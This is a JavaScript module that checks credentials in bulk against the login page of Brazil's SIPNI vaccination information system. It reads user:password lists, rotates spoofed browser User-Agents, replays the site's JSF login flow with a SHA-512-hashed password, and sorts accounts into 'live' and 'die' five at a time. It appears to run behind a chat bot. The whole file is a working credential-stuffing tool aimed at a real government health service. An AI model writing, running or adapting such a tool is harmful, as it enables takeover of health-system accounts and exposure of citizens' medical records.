import crypto from 'crypto';

const BASE_URL = 'https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf';

function getStr(str, start, end) {
  const idx = str.indexOf(start);
  if (idx === -1) return '';
  const from = idx + start.length;
  const endIdx = str.indexOf(end, from);
  return endIdx === -1 ? '' : str.slice(from, endIdx).trim();
}

function getRandomUA() {
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  ];
  return uas[Math.floor(Math.random() * uas.length)];
}

async function fetchWithCookies(url, options = {}) {
  const headers = {
    'User-Agent': getRandomUA(),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    ...options.headers,
  };

  if (options.cookieJar && options.cookieJar.length > 0) {
    headers['Cookie'] = options.cookieJar.join('; ');
  }

  const fetchOpts = {
    method: options.method || 'GET',
    headers,
    redirect: 'manual',
    signal: options.signal || AbortSignal.timeout(30000),
  };

  if (options.body) fetchOpts.body = options.body;

  let response = await fetch(url, fetchOpts);
  let status = response.status;

  // Follow HTTP redirect manually to keep cookies
  if (status >= 300 && status < 400) {
    const location = response.headers.get('location');
    if (location) {
      const redirectUrl = location.startsWith('http') ? location : `https://sipni.datasus.gov.br${location}`;
      fetchOpts.method = 'GET';
      delete fetchOpts.body;
      response = await fetch(redirectUrl, fetchOpts);
      status = response.status;
    }
  }

  let body = '';
  try { body = await response.text(); } catch (e) { /* empty */ }

  // Update cookie jar
  if (options.cookieJar) {
    const cookies = typeof response.headers.getSetCookie === 'function'
      ? response.headers.getSetCookie()
      : (response.headers.get('set-cookie') || '').split(',').filter(Boolean);
    for (const c of cookies) {
      const parts = c.split(';')[0];
      if (parts) {
        const name = parts.split('=')[0];
        const idx = options.cookieJar.findIndex(cj => cj.startsWith(name + '='));
        if (idx !== -1) options.cookieJar.splice(idx, 1);
        options.cookieJar.push(parts);
      }
    }
  }

  return { body, status };
}

const runs = new Map();

export function cancelRun(chatId) {
  const run = runs.get(chatId);
  if (run) {
    run.cancelled = true;
    if (run.controller) run.controller.abort();
  }
}

/**
 * Check a single SIPNI login — fast, no delays, no retries
 */
async function checkOne(user, pass, signal) {
  const cookieJar = [];

  try {
    // 1. GET login page
    const step1 = await fetchWithCookies(BASE_URL, { cookieJar, signal });

    const viewState = getStr(step1.body, 'id="javax.faces.ViewState" value="', '"')
      || getStr(step1.body, 'name="javax.faces.ViewState" id="javax.faces.ViewState" value="', '"');

    if (!viewState || step1.body.includes('Página rejeitada')) {
      return { status: 'error', user, pass, reason: 'Site rejeitou' };
    }

    // 2. Hash + POST login
    const hash = crypto.createHash('sha512').update(pass).digest('hex');

    const postBody = new URLSearchParams({
      'javax.faces.partial.ajax': 'true',
      'javax.faces.source': 'j_idt23:j_idt35',
      'javax.faces.partial.execute': '@all',
      'j_idt23:j_idt35': 'j_idt23:j_idt35',
      'j_idt23': 'j_idt23',
      'javax.faces.ViewState': viewState,
      'j_idt23:usuario': user,
      'j_idt23:senha': hash,
    }).toString();

    const step2 = await fetchWithCookies(BASE_URL, {
      method: 'POST',
      body: postBody,
      cookieJar,
      signal,
      headers: {
        'Faces-Request': 'partial/ajax',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      },
    });

    // Check die immediately from POST response
    if (step2.body.includes('Usuário ou senha incorreto!')) {
      return { status: 'die', user, pass };
    }

    // Follow AJAX redirect
    const redirect = getStr(step2.body, '<redirect url="', '"');
    let finalBody = step2.body;

    if (redirect) {
      const redirectUrl = redirect.startsWith('http') ? redirect : `https://sipni.datasus.gov.br${redirect}`;
      const step3 = await fetchWithCookies(redirectUrl, { cookieJar, signal });
      finalBody = step3.body;
    }

    const isLive = finalBody.includes('Sair') || finalBody.includes('Logout');
    const isDie = finalBody.includes('Usuário ou senha incorreto!');

    if (isLive) return { status: 'live', user, pass };
    if (isDie) return { status: 'die', user, pass };

    return { status: 'error', user, pass, reason: 'Não foi possível determinar' };
  } catch (err) {
    if (err.name === 'AbortError') return { status: 'error', user, pass, reason: 'Cancelado' };
    return { status: 'error', user, pass, reason: err.message };
  }
}

/**
 * Check multiple SIPNI logins concurrently (5 at a time)
 */
export async function checkSipniBatch(chatId, lines, onProgress) {
  const total = lines.length;
  const results = { live: [], die: [], errors: [] };

  const run = { cancelled: false, controller: new AbortController() };
  runs.set(chatId, run);

  // Parse all valid logins first
  const logins = [];
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed) continue;
    const sep = trimmed.includes(':') ? ':' : '|';
    const parts = trimmed.split(sep);
    if (parts.length < 2) continue;
    logins.push({ user: parts[0].trim(), pass: parts.slice(1).join(sep).trim() });
  }

  // Process concurrently in batches of 5
  const CONCURRENCY = 5;
  let done = 0;

  for (let i = 0; i < logins.length; i += CONCURRENCY) {
    if (run.cancelled) break;

    const batch = logins.slice(i, i + CONCURRENCY);
    const batchResults = await Promise.all(
      batch.map(l => checkOne(l.user, l.pass, run.controller.signal))
    );

    for (const result of batchResults) {
      if (result.status === 'live') results.live.push(result);
      else if (result.status === 'die') results.die.push(result);
      else results.errors.push(result);

      done++;
      if (onProgress) onProgress(result.status, result, done, total);
    }
  }

  runs.delete(chatId);
  return results;
}
